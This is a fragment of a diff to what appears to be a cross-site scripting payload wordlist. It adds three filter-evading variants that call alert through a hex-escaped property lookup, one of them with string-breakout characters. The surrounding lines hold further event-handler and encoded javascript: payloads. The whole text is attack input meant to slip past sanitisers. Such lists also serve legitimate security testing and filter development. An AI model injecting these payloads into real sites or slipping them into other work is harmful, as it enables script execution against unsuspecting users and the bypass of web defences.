@@ -1346,6 +1346,9 @@ hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
 <svg onload=write()>
 <svg onload=alert(xss)>
 <body onload=alert(xss)>
+top['al\x65rt']('xss')
+-top['al\x65rt']('xss')-
+"-top['al\x65rt']('xss')-"
 <img src=x onerror=alert(xss)>
 <body onpageshow=alert(xss)>
 <input autofocus="" onfocus=alert(xss)></input>
